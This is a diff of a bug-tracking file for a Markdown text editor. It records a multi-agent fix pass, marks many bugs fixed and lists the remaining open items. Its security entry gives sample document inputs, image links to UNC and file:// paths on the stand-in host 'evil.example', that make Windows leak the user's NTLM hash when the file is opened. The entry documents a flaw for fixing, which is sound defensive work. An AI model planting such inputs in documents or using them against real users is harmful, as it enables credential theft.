@@ -1,6 +1,6 @@
 # Notepadly: bug list and status
 
-**Updated:** 20 November 2026 · **Branch:** `fix/bugs-and-multi-window`
+**Updated:** 19 November 2026 (agent pass) · **Branch:** `fix/bugs-and-multi-window`
 
 **Status:**
 - The first report (10 November 2026, commit `c578712`) listed 70 issues.
@@ -9,7 +9,7 @@
 - The full first report, with the original steps for every bug, is in git history (`git show 28f46c2:BUGS.md`).
 
 **Tests:**
-- `npm test`: 594 tests pass, none skipped (after the code review of 19-20 November).
+- `npm test`: 743 tests pass, none skipped (after the multi-agent fix pass; 594 before it).
 - `npm run typecheck` is clean.
 - The Rust code (`src-tauri`) does not build on Linux, so the Rust changes on this branch were made by careful reading and have **not been compiled or run on Windows yet**. See section 1.4.
 
@@ -22,6 +22,37 @@
 ---
 
 # Part 1: Still to do
+
+## 1.0 Multi-agent fix pass (19 November 2026)
+
+Five agents worked in parallel (live preview, editor core, state and lifecycle, Rust backend, UI). Every fix has a test that fails without it. Headings below marked **✔** are fixed. Summary of what is **still open** after this pass:
+
+- **M13** (streaming whole-file actions) — not started.
+- **M14** — F3, Shift+F3 and Replace all still search synchronously.
+- **M12** — callout fold state is still reset after hibernation.
+- **H6, L5, W8, F2 remainders** (section 1.3) — unchanged. **H8** — partly: an unchanged draft is no longer re-sent.
+- **M15** — code pages 437 and 850 are not supported by `encoding_rs` and still read as windows-1252 (866, KOI8, ISO-8859-x, GB18030, EUC and Mac pages now map). A binary-file warning is shown.
+- **FILES-2, FILES-3** — left as they are (same as Notepad).
+- **pathsEqual** — `..`, `.`, `\\?\` are handled; 8.3 short names and mapped drive vs UNC still need Rust.
+- **1.6** — the opener deny list is now case-insensitive and longer; `\\?\` cannot be denied in the asset scope (Tauri canonicalises every path to `\\?\` first).
+- **Optional "Load remote images" setting** — not done.
+- **All Rust changes are only type-checked** (`cargo check`/`clippy` for `x86_64-pc-windows-msvc` on Linux) plus the pure-logic tests in `files.rs`, `store.rs` and `window_state.rs` run on Linux through stand-ins. Section 1.1 still applies: run `cargo test` and build on Windows first.
+
+**New Tauri commands:** `window_closing() -> bool`, `window_close_cancelled()`, `open_paths_set(paths)`, `path_open_elsewhere(path) -> string | null` (focuses that window and emits `open-paths-here`), `user_locale() -> string`. **New `FileChunk` fields:** `mixedEol`, `readOnly`, `binary`. **New `SaveRequest` field:** `originalEncoding`.
+
+**New bugs found and fixed in this pass:**
+- `resolveRelative` doubled the separator when the folder ended in one.
+- PREV-6 and PREV-8 were marked ✅ but were not fixed; both are fixed now.
+- The opener deny list missed upper-case names (`SETUP.EXE`), because glob matching is case-sensitive.
+- `cargo fmt --check` and a clippy type-complexity error already failed CI.
+- A broken symlink was replaced by a regular file on save; a kept failed-save temp file is now renamed `*.recovered.txt`; crash-left session temp files are cleaned up.
+- Find could get stuck on an empty match.
+- After a reload the picked line ending was kept, so the next save rewrote every line ending.
+- Help showed `Ctrl++` as empty key caps; status bar pickers hid their value from screen readers; held Enter on "Don't save"/Cancel typed newlines into the editor.
+- A near-end timer could fire after teardown (`window is not defined` in tests).
+
+**Smaller open points fixed:** list Enter/Tab numbering, Ctrl+wheel zoom per notch (editor and page), deleted partial file message, read-only warning and status cell, early typing kept, RTL table cells, L11 (`%%` and front matter bounded), L16 (unreadable draft kept). **Improvements done:** KaTeX `maxSize`, widget offsets, cached Mermaid errors, faster large-table typing, inline maths scan, Find whole word and regex, cheaper find highlights, no hidden Ctrl+U, menu access keys, Move to new window, tab strip and Settings radio accessibility, tooltips on focus, W3 page menu, Save As re-reads tab, close waits at most 5 s, two-window test harness, M21 and MERGE-1 tests, all Rust review items, CI actions pinned to SHAs and `npm audit` job.
+
 
 ## 1.1 First thing: run and check the Rust changes on Windows
 
@@ -50,31 +81,31 @@ These were written on Linux and only type-checked, or only read. Do this before 
 - Above roughly 500 MB, `getText()` fails on the JS string limit. Printing 100 MB freezes the UI in `marked.parse`.
 - **To do:** streaming Find/Print/Save As and a full load that can be cancelled, across `src/lib/loader.ts`, the engine and `src/lib/print.ts`.
 
-### M14. Find scans the whole file on each keystroke in big files 📖
+### M14. Find scans the whole file on each keystroke in big files 📖 — ✔ mostly fixed (19 Nov): count runs in time slices; F3/Shift+F3/Replace all still synchronous
 - `recount` and `firstFrom` run on the UI thread (120 ms debounce only). In a 100 MB file with few matches the UI can stall on each letter.
 - **Cause:** `src/editor/find.ts`.
 - **To do:** an incremental or background match count, with the result sent to the find bar when ready.
 
-### TAB-1. Only the current Find match is shown inside a table cell 📖
+### TAB-1. Only the current Find match is shown inside a table cell 📖 — ✔ fixed (19 Nov, agent pass)
 - **What happens:** search a word that appears in several table cells. The current match is marked in its cell, but the other matches in tables get no highlight (matches in normal text do).
 - **Cause:** `src/editor/livePreview/widgets.ts` `TableController.showSelection` marks the editor selection only. The `cm-find-match` marks of `src/editor/find.ts` cannot reach the widget's cells.
 - **Fix:** pass the find query to the table widgets and mark every match in the rendered cells.
 
-### TAB-2. Maths, images and wikilinks are not rendered in table cells (rest of L8) 📖
+### TAB-2. Maths, images and wikilinks are not rendered in table cells (rest of L8) 📖 — ✔ fixed (19 Nov, agent pass)
 - `src/editor/livePreview/widgets.ts` `renderCellHtml` handles bold, italic, strike, highlight, code and links only.
 
-### TAB-3. Emphasis rules run inside a link target in a table cell 📖
+### TAB-3. Emphasis rules run inside a link target in a table cell 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** a cell `[x](https://a.b/_c_/d)` or `[x](https://a.b/*c*)`.
 - **Actual:** the URL in `data-href` gets `<em>` tags, so the link is broken. **Expected:** the target is left as written.
 - **Cause:** `renderCellHtml` (`src/editor/livePreview/widgets.ts`) replaces emphasis before links.
 - **Fix:** swap links out first, as is done for code spans.
 
-### TAB-4. Escape in a table at the end of a partly loaded file adds a newline in the middle of the file 📖
+### TAB-4. Escape in a table at the end of a partly loaded file adds a newline in the middle of the file 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** open a big file that loads in parts, where the loaded part ends inside a table. Click a cell of the last row and press Escape before the rest loads.
 - **Cause:** `TableController.leave` (`src/editor/livePreview/widgets.ts`) adds a `\n` at the end of the document; the loader then appends the next chunk after it. The extra newline is saved with the next real edit.
 - **Fix:** skip the newline (stay in the cell) while the tab is not fully loaded.
 
-### FILES-1. A mixed-line-ending file cannot be normalised to its first line's style 📖
+### FILES-1. A mixed-line-ending file cannot be normalised to its first line's style 📖 — ✔ fixed (19 Nov, agent pass)
 - **What happens:** the file starts with CRLF but also has LF lines. Picking "Windows (CRLF)" in the status bar does nothing (it is already shown), so the LF lines stay; since H14, a save keeps them too.
 - **Workaround:** pick LF, then CRLF.
 - **Cause:** `src/state/actions.ts` `changeFileFormat` returns early when the picked line ending equals `tab.eol`; the frontend does not know the file is mixed.
@@ -89,21 +120,21 @@ These were written on Linux and only type-checked, or only read. Do this before 
 - **What happens:** when the folder allows no new files, the file is overwritten in place. If the write fails part way (disk full, network drop), the file is damaged and no temp copy exists.
 - **Cause:** `src-tauri/src/files.rs` `write_in_place`. Notepad has the same limit.
 
-### MD-1. Maths and Mermaid inside a list, quote or callout show as source in Formatted mode 📖
+### MD-1. Maths and Mermaid inside a list, quote or callout show as source in Formatted mode 📖 — ✔ fixed (19 Nov); a block starting on the list marker line (`- $$`) stays source
 - **What happens:** since L12, `$$` blocks inside a list or quote are parsed as maths, but the live preview only turns top-level blocks into widgets, so they show as styled source. Print renders them.
 - The same limit applies to tables, `---` rules and Mermaid inside a list, quote or callout (from H5).
 - **Cause:** `src/editor/livePreview/block.ts` builds block widgets for children of `Document` only.
 
-### MD-2. The real regional date/time format is not available to F5 📖
+### MD-2. The real regional date/time format is not available to F5 📖 — ✔ fixed (19 Nov, agent pass)
 - **What happens:** F5 uses the WebView's locale, which follows the Windows display language. With an English UI and a UK or German region, F5 still gives the US order.
 - **Fix:** read the user's locale name in Rust (`GetUserDefaultLocaleName`) and pass it to `formatDateTime`.
 
-### WIN-3. One file can be open in two windows (last point of M10) 📖
+### WIN-3. One file can be open in two windows (last point of M10) 📖 — ✔ fixed (19 Nov, agent pass)
 - **What happens:** a window does not know which files the other windows have open, so opening a file that is open in another window opens a second copy.
 - This is safe: saving in one gives "changed on disk" in the other.
 - **Fix:** keep a shared list of open paths in Rust, updated as tabs open and close.
 
-### MERGE-1 (remaining risk). A brand-new draft can be pruned at start 📖
+### MERGE-1 (remaining risk). A brand-new draft can be pruned at start 📖 — ✔ fixed (19 Nov, agent pass)
 - At start, the first window deletes drafts that no stored session owns (L16).
 - A window opened at start that writes a draft for a brand-new tab before that clean-up runs could still lose it. The time window is very short.
 - **Fix:** run the clean-up before opening the other windows, or have Rust skip drafts newer than the start of the run.
@@ -196,20 +227,20 @@ PREV-1 to PREV-5 are fixed (see 2.3). Their tests are in `src/editor/livePreview
 
 ### Bugs
 
-#### PREV-6. Typing a list or quote marker at the start of a row in a table without outer pipes cuts the table ✅
+#### PREV-6. Typing a list or quote marker at the start of a row in a table without outer pipes cuts the table ✅ — ✔ fixed (19 Nov, agent pass)
 - **Steps:** a table without outer pipes (`a | b` / `--|--` / `c | d` / `e | f`). Click cell `e` and type `- ` at its start, so the row becomes `- e | f`.
 - **Actual:** the line now starts a list item, so the table ends above it. The cell being edited is removed from the page, focus is lost, and the next keys go nowhere. Seen in a jsdom probe: the table shrank and the cell's `isConnected` was false. `#`, `>`, `1.` and `+` do the same.
 - **Expected:** the text stays in the cell.
 - **Cause:** `TableController.writeCell` (`src/editor/livePreview/widgets.ts`) writes the cell text as it is. For the first cell of a row with no leading `|`, that text is also the start of the line.
 - **Fix:** when the first cell of a row without a leading pipe is written, rewrite the row with `formatRow` (this adds the pipes), or escape a leading block marker (`\-`, `\#`, `\>`).
 
-#### PREV-7. Relative images stay broken after the first save or Save As to another folder 📖
+#### PREV-7. Relative images stay broken after the first save or Save As to another folder 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** paste `![](pic.png)` into a new untitled tab, then save it next to `pic.png`. Or use Save As to move a note to another folder.
 - **Actual:** the image stays broken, or keeps showing the old folder's file, until the line scrolls out of view and back, or is edited.
 - **Cause:** `ImageWidget.toDOM` (`src/editor/livePreview/widgets.ts`) resolves the path once through `previewContext.baseDir()`. `ImageWidget.eq` compares the raw `src` only, so CodeMirror keeps the old `<img>`. Nothing tells the editor that the tab's path changed: `src/editor/api.ts` has no such hook, and `EditorEngine` never redraws on a rename.
 - **Fix:** add an `engine.pathChanged(tabId)` call from the save and rename actions that dispatches an effect. Let the inline plugin rebuild on that effect, and store the resolved src in the widget so `eq` sees the change.
 
-#### PREV-8. A leading-slash image path resolves against the document folder, but a leading-slash link resolves against the drive root ✅
+#### PREV-8. A leading-slash image path resolves against the document folder, but a leading-slash link resolves against the drive root ✅ — ✔ fixed (19 Nov, agent pass)
 - **Steps:** a document in `C:\docs` with `![](/img/a.png)` and `[x](/img/a.md)`.
 - **Actual:** the image loads `C:\docs\\img\a.png`, but Ctrl+click on the link opens `C:\img\a.md`.
 - **Cause:** `joinBase` in `src/editor/livePreview/context.ts` joins any non-absolute path to the base. `classifyHref` in `src/state/logic.ts` uses `rootOf(baseDir)`.
@@ -220,7 +251,7 @@ PREV-1 to PREV-5 are fixed (see 2.3). Their tests are in `src/editor/livePreview
 - **Cause:** `safeImageSrc` in `src/lib/print.ts` passes `file://server/...` and `\\server\...` to `convertFileSrc`. Printing a downloaded note then sends the user's NTLM credentials to that server.
 - **Fix:** move `networkHost` from `context.ts` to `src/state/logic.ts`, and apply the same rule in `print.ts`.
 
-#### PREV-10. A link in a table cell whose URL has parentheses is cut short ✅
+#### PREV-10. A link in a table cell whose URL has parentheses is cut short ✅ — ✔ fixed (19 Nov, agent pass)
 - **Steps:** a cell `[w](https://en.wikipedia.org/wiki/Foo_(bar))`.
 - **Actual:** `data-href` is `https://en.wikipedia.org/wiki/Foo_(bar`, and a stray `)` shows after the link. Outside tables, the same link works.
 - **Cause:** the link regex in `renderCellHtml` (`src/editor/livePreview/widgets.ts`) is `\(([^)\s]+)\)`.
@@ -247,7 +278,7 @@ Threat model: the user opens an untrusted Markdown or text file. Checked: HTML, 
 
 ### Bugs
 
-#### SEC-2. Opening a document makes Windows send the user's NTLM hash to any server the document names 📖 — images fixed (PREV-3 for the editor, PREV-9 for print); links still open by click
+#### SEC-2. Opening a document makes Windows send the user's NTLM hash to any server the document names 📖 — images fixed (PREV-3 for the editor, PREV-9 for print); links still open by click — ✔ links now ask before opening a file on another computer; device paths refused (19 Nov)
 - **Input:** a `.md` file containing `![](\\evil.example\s\x.png)`, `![](file://evil.example/s/x.png)` or `![[\\evil.example\s\x.png]]`, opened in Formatted mode (the default for `.md`). Printing such a file does the same for `<img src="\\evil.example\...">`.
 - **Actual:** the image is requested as soon as it is shown. Nothing has to be clicked.
   - `resolveImageSrc` (`src/editor/livePreview/context.ts:41`, `joinBase` accepts `\\` paths) and `safeImageSrc` (`src/lib/print.ts:36`) pass the UNC path to `convertFileSrc`.
@@ -277,14 +308,14 @@ STATE-1 to STATE-4 are fixed (see 2.3). Tests: `src/state/lifecycle.test.ts`.
 
 ### Bugs
 
-#### STATE-5. A tab move that times out leaves the tab in both windows, sharing one draft 📖
+#### STATE-5. A tab move that times out leaves the tab in both windows, sharing one draft 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** drag a dirty tab to a new window on a slow or busy PC, so the new window confirms after 10 s (or its `tab-received` emit fails, which is only logged).
 - **Actual:** the source shows "did not take the tab, so it stays here" and keeps it; the target has taken it too. Both tabs have the same id, so both own draft `<id>`. Closing the tab in one window with "Don't save", or saving it, deletes that draft (`disposeTab`, `src/lib/loader.ts:677`; flush delete). The other window's session still says `hasDraft`, so on the next start its unsaved text is gone (`materialise` finds no draft and loads the file).
 - **Expected:** a tab lives in one window only, or the copies are independent.
 - **Cause:** `src/state/actions.ts` `waitForReceipt` (timeout, `MOVE_TIMEOUT_MS`) has no way to take the tab back from the target; `receiveTab` answers but never learns the source gave up.
 - **Fix:** the target asks "may I keep it?" and the source answers yes only if it has not timed out (two-step handshake), or the target gives the received tab a new id and writes its own draft at once.
 
-#### STATE-6. A moved tab loses its runtime state 📖
+#### STATE-6. A moved tab loses its runtime state 📖 — ✔ fixed (19 Nov, agent pass)
 - `handOff`/`takeOver` (`src/lib/loader.ts:692`, `:709`) carry text, snapshot, draft and `forceDirty` only. Lost: `dismissed`, `eolChosen`, `cleanDelete`, `unreadable`, `sleep`.
 - **Effects:**
   - Keep mine on a changed file, then move the tab: the "changed on disk" bar comes back in the new window.
@@ -292,18 +323,18 @@ STATE-1 to STATE-4 are fixed (see 2.3). Tests: `src/state/lifecycle.test.ts`.
   - H7 after a move: a clean tab flagged deleted stays unsaved when the file comes back.
 - **Fix:** add these fields to `TabHandoff` (and `eolChosen` to `SessionTab`).
 
-#### STATE-7. Right after a move, a crash can lose the moved tab's unsaved text 📖
+#### STATE-7. Right after a move, a crash can lose the moved tab's unsaved text 📖 — ✔ fixed (19 Nov, agent pass)
 - `receiveTab` (`src/state/actions.ts`) confirms the move before the target stores its session (`takeOver` only schedules it, 800 ms or more). The source then removes the tab and writes a session without it.
 - If the target window or the app dies within that pause, no stored session lists the tab, and the next start's `pruneDrafts` deletes its draft.
 - The other way round, a crash of the source before its flush leaves the tab in both stored sessions (duplicate on restart).
 - **Fix:** in `receiveTab`, write the target's session (`flushPersistence`) before `answer()`; flush the source's session right after `removeFromList(id, true)`.
 
-#### STATE-8. Closing two windows at once asks about every unsaved tab and drops both sessions 📖
+#### STATE-8. Closing two windows at once asks about every unsaved tab and drops both sessions 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** "continue previous session" on, two windows with unsaved tabs, taskbar > "Close all windows".
 - **Actual:** each window calls `ipc.isLastWindow()` (`src/state/actions.ts:681`) while the other is still on screen, so both take the "not last" path: they ask "save changes?" for each tab and delete their sessions. **Expected (WIN-2):** the last window keeps its tabs as drafts without asking.
 - **Fix:** let Rust decide "last" atomically (count windows that have started closing), or treat a close that arrives within a short time of another window's close as an exit.
 
-#### STATE-9. Saving a partly loaded file that was deleted says "changed by another program" 📖
+#### STATE-9. Saving a partly loaded file that was deleted says "changed by another program" 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** open a file over 2 MB (partly loaded), delete it in Explorer, poll flags "deleted", edit, press Ctrl+S.
 - **Actual:** `doWrite` sends the old stamp (`src/lib/loader.ts:575`, a partial tab keeps it), Rust answers STALE, and `writeAndReport` (`src/state/actions.ts`) sets `externalChange: "modified"` over "deleted" and shows "This file was changed by another program". **Expected:** a message that the file was deleted and only the loaded part can be saved (Save As, C3 path).
 
@@ -319,28 +350,28 @@ Reviewed `src-tauri/src` (files, store, lib, autoupdate, fonts, background), `ta
 
 ### Bugs
 
-#### RUST-4. Saving a file opened through an NTFS alternate data stream fails 📖
+#### RUST-4. Saving a file opened through an NTFS alternate data stream fails 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** `notepadly notes.txt:secret` (or open that path), type, Ctrl+S.
 - **Actual:** opening works (`paths_from_args` keeps it, since `is_file()` is true for a stream). Save makes a temp file and then calls `ReplaceFileW` on `notes.txt:secret`, which works on files only, or for a new stream renames the temp file to a stream name. Expected to fail with an error every time (not checked on Windows). Nothing is lost: the temp file is removed and the stream is unchanged.
 - **Expected:** saves into the stream, like Notepad.
 - **Cause:** `src-tauri/src/files.rs` `commit` (rename / `replace_file`) does not handle stream paths.
 - **Fix:** when the last path component contains `:`, skip the temp file and write in place (`write_in_place`, opened with `create(true)` for a new stream). Test on Windows first.
 
-#### RUST-5. A window opened a moment before another closes can stay hidden for good 📖
+#### RUST-5. A window opened a moment before another closes can stay hidden for good 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** with background mode on and one window open, press Ctrl+N and close the first window at once (before the new window has painted, about 200 ms). Later close the new window too. Then start Notepadly again.
 - **Actual:** `is_last_window` counts only visible windows, and a new window stays hidden until its first paint. So the first window thinks it is the last and goes to the background. When the new window closes, it goes to the background too: two hidden windows. The next launch wakes only `main` (or the first in the list). The other one stays hidden, using memory, until Exit.
 - **Expected:** a booting window counts as on screen; only one window ever waits in the background.
 - **Cause:** `src-tauri/src/background.rs` `is_last_window` (`!w.is_visible()`); a new window is created with `visible: false` (`tauri.conf.json`).
 - **Fix:** keep a "booting" set in `WindowPaths` (from `open_window` until the frontend shows the window) and treat those windows as on screen in `is_last_window` and `no_window_on_screen`.
 
-#### RUST-6. A launch during a background update can start hidden and drop the file it was opened with 📖
+#### RUST-6. A launch during a background update can start hidden and drop the file it was opened with 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** an update installs from the background. While the installer runs (a few seconds), double-click a `.txt` file.
 - **Actual:** the new process finds the fresh `resume-in-background` marker, consumes it, starts hidden and ignores its arguments (`setup`: `paths = Vec::new()` when `hidden`). The file does not open and no window shows. The installer's own restart then starts normally.
 - **Expected:** a launch with files always shows them.
 - **Cause:** `src-tauri/src/autoupdate.rs` `take_resume_marker` and `src-tauri/src/lib.rs` `setup` treat any launch within 10 minutes of the marker as the installer's restart.
 - **Fix:** pass a flag on the restart command line (or check the parent process), or at least never start hidden when the command line has file arguments.
 
-#### RUST-7. Two windows saving the same file at the same moment can both succeed 📖
+#### RUST-7. Two windows saving the same file at the same moment can both succeed 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** the same file is open in two windows (WIN-3) and both save within a few milliseconds.
 - **Actual:** both `save` calls can pass the last `ensure_fresh` before either one's `commit`. Both report success, and the second silently replaces the first. Each window holds a different stamp, so the first window's next save is refused as STALE, but its text is already gone from disk. The window is small (from `ensure_fresh` to `ReplaceFileW`), but nothing closes it inside the process.
 - **Cause:** `src-tauri/src/files.rs` `save`: the final `ensure_fresh` and `commit` are not atomic.
@@ -363,28 +394,28 @@ Fixed on this branch: UI-1 to UI-8 (see 2.3; each has a test that fails without 
 
 ### Bugs
 
-#### UI-9. A message replaces whatever dialog is open, and a second message hides the first 📖
+#### UI-9. A message replaces whatever dialog is open, and a second message hides the first 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** open Go to line (Ctrl+G) or the Link dialog and start typing while a save or load fails in the background; or Save all with two files that fail.
 - **Actual:** the Go to / Link / Page setup dialog and what was typed in it vanish; with two errors only the last one is ever seen. **Expected:** messages wait their turn, as Windows stacks modal boxes, and the dialog underneath comes back.
 - **Cause:** `src/state/store.ts:211-217` `showMessage` sets `dialog` to the message unconditionally; `src/components/Dialogs.tsx` shows one dialog at a time.
 - **Fix:** a small dialog queue in the store. A message over another message or an input dialog is queued and shown after it closes (`confirm-close` keeps its C4 handling).
 
-#### UI-10. Windows high contrast: the unsaved dot, the active tab and the toggles disappear 📖 ⚠️
+#### UI-10. Windows high contrast: the unsaved dot, the active tab and the toggles disappear 📖 ⚠️ — ✔ fixed in CSS (19 Nov); check on Windows
 - **Steps:** Windows Settings > Accessibility > Contrast themes > Night sky, then edit a tab.
 - **Actual (from the CSS):** forced colours replace backgrounds. The unsaved dot (`.tab-close .dot`, `background: currentColor`, `src/styles/app.css` ~213), the active tab (marked only by its background), the toggle knob and radio marks (`src/styles/settings.css`) and the find highlights stop being visible. There is no `@media (forced-colors: active)` rule anywhere.
 - **Fix:** add a `forced-colors` block: `forced-color-adjust: none` with `CanvasText` / `Highlight` for the dot and the switches, and a `Highlight` border for the active tab and the menu's hot item. Check in the real app.
 
-#### UI-11. Two quick Ctrl+P presses print the wrong page or an empty one 📖
+#### UI-11. Two quick Ctrl+P presses print the wrong page or an empty one 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** press Ctrl+P, release, and press it again before the first print preview opens (a big Formatted file takes a while in `marked` and image loading).
 - **Cause:** `src/lib/print.ts:379` `printTab` calls `cleanup()` first, which removes the root the first run already put in the page; both runs then call `window.print()`. `actions.print` has no "already printing" guard. Key repeat is blocked, but two presses are not.
 - **Fix:** ignore Print while a print is being prepared or its dialog is open (a flag cleared on `afterprint` or on error).
 
-#### UI-12. Urdu / right-to-left text prints left-aligned 📖
+#### UI-12. Urdu / right-to-left text prints left-aligned 📖 — ✔ fixed (19 Nov, agent pass)
 - **Actual:** in the editor every line has `dir="auto"`. In print, Formatted paragraphs, list items, headings and table cells have no `dir`, and Plain text is one `<pre>`, so Urdu lines print left-aligned with punctuation and numbers on the wrong side.
 - **Cause:** `src/lib/print.ts:383-394`.
 - **Fix:** after `sanitizeHtml`, set `dir="auto"` on `p, li, h1-h6, td, th, blockquote`; for Plain text, write one `<div dir="auto">` per line in a `pre-wrap` block.
 
-#### UI-13. Escape during a tab drag also closes the find bar 📖
+#### UI-13. Escape during a tab drag also closes the find bar 📖 — ✔ fixed (19 Nov, agent pass)
 - Since UI-3, Escape cancels a tab drag. The global key handler (`src/lib/shortcuts.ts`, window capture, registered first) still sees the same Escape and closes the find bar or Settings.
 - **Fix:** expose `isTabDragging()` from the strip (or mark the event) and let `onKeyDown` skip it.
 
@@ -413,30 +444,30 @@ Reviewed `src/editor/index.ts`, `markdown.ts`, `commands.ts`, `find.ts`, `tableM
 
 ### Bugs
 
-#### EDIT-7. Bold over a selection that already holds bold text doubles the markers ✅
+#### EDIT-7. Bold over a selection that already holds bold text doubles the markers ✅ — ✔ fixed (19 Nov, agent pass)
 - **Steps:** select all of `**bold** and **more**`, press Ctrl+B.
 - **Actual:** `****bold** and **more****` (broken Markdown). **Expected:** the whole line bold (`**bold and more**`), as Word and Typora do, or the bold removed.
 - **Cause:** `src/editor/commands.ts` `toggleInline` only unwraps when one node of that kind encloses the whole selection; otherwise it always wraps.
 - **Fix:** when the selection contains nodes of the same kind, remove their marks inside the range and wrap the whole once.
 
-#### EDIT-8. "Insert column" in an extra cell of a long row puts the column in the wrong place ✅
+#### EDIT-8. "Insert column" in an extra cell of a long row puts the column in the wrong place ✅ — ✔ fixed (19 Nov, agent pass)
 - **Steps:** table `| a | b |` / `| --- | --- |` / `| 1 | 2 | 3 |`; cursor in the `3` cell; Insert column right.
 - **Actual:** header `| a | b |  |`, row `| 1 | 2 | 3 |  |`: the new header column lines up with `3`, the new body cell is a 4th one. **Expected:** the command does nothing past the header's columns, or pads the header first.
 - **Cause:** `src/editor/commands.ts` `editTable` (`col-left` / `col-right`): `locateTable` can return a column ≥ the header's column count since L10, and `splice` on the shorter rows appends at their end.
 - **Fix:** clamp `column` to `columns - 1` for the column commands, or pad every row to the longest row first.
 
-#### EDIT-9. A paragraph line starting with `$$` turns the rest of the paragraph into maths ✅
+#### EDIT-9. A paragraph line starting with `$$` turns the rest of the paragraph into maths ✅ — ✔ fixed (19 Nov, agent pass)
 - **Steps:** `Cost:` then on the next line `$$5 total`, then `more text`.
 - **Actual:** `$$5 total` and `more text` become a `BlockMath` block up to the next blank line. **Expected:** text, as `$$` with no closing `$$` on that line inside a paragraph is not display maths in Obsidian/KaTeX editors.
 - **Cause:** `src/editor/markdown.ts` `BlockMath.endLeaf` interrupts a paragraph at any line starting with `$$`.
 - **Fix:** in `endLeaf`, interrupt only when the line is `$$` alone (optionally with trailing spaces) or holds a closing `$$`.
 
-#### EDIT-10. Edit > Paste can land in another tab 📖
+#### EDIT-10. Edit > Paste can land in another tab 📖 — ✔ fixed (19 Nov, agent pass)
 - **Steps:** Edit > Paste while WebView2 shows its clipboard permission prompt (W2), click another tab, then allow.
 - **Cause:** `src/editor/index.ts` `paste()` awaits `navigator.clipboard.readText()` and then inserts into whatever document is active. `cut()` already checks that the view state did not change; `paste()` does not.
 - **Fix:** remember `activeId` (and the selection) before the await and drop the paste if they changed.
 
-#### EDIT-11. Paste or F5 with several cursors can break a table row 📖
+#### EDIT-11. Paste or F5 with several cursors can break a table row 📖 — ✔ fixed (19 Nov); not reachable today, multiple selections are off
 - **Cause:** `src/editor/index.ts` `insertText` decides on `escapeCellText` from the main selection only, then `replaceSelection` inserts the same text at every cursor. A secondary cursor inside a table gets raw newlines and pipes.
 - **Fix:** use `changeByRange` and escape per range.
 
